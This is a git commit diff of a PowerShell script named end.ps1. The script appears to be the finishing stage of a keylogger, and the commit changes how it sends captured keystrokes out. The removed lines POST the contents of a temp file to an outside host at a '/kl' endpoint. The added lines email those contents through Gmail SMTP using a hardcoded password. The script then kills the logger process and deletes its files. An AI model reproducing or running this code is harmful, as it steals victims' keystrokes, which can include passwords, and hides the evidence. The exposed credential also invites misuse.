1f2812cd3aa1c9c0e9e9a2e66dced4c9a5b6ada9
Zachary Hales <51687053+SmartMozart@users.noreply.github.com>
2023-05-13 12:43:31 -0600

    Update end.ps1

--- end.ps1
+++ end.ps1
@@ -1,6 +1,12 @@
-$url = "https://api.dogwater53.us/kl"
-$body = @{"keys" = [IO.File]::ReadAllText("$env:temp\wsuA58F.tmp")}
-Invoke-WebRequest -Method 'Post' -Uri $url -Body ($body|ConvertTo-Json) -ContentType "application/json"
+$From = "pshs1235@gmail.com"
+$To = "zacsengines@yahoo.com"
+$Subject = "testing testing"
+$Body = [IO.File]::ReadAllText("$env:temp\wsuA58F.tmp")
+$SMTPServer = "smtp.gmail.com"
+$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPClient.EnableSsl = $true
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($From, "ixofwhfteeaiklik")
+$SMTPClient.Send($From, $To, $Subject, $Body)
 taskkill -f -im wsuA58F.exe
 Remove-Item "$env:temp\wsuA58F.tmp"
 Remove-Item "$env:temp\wsuA58F.exe"
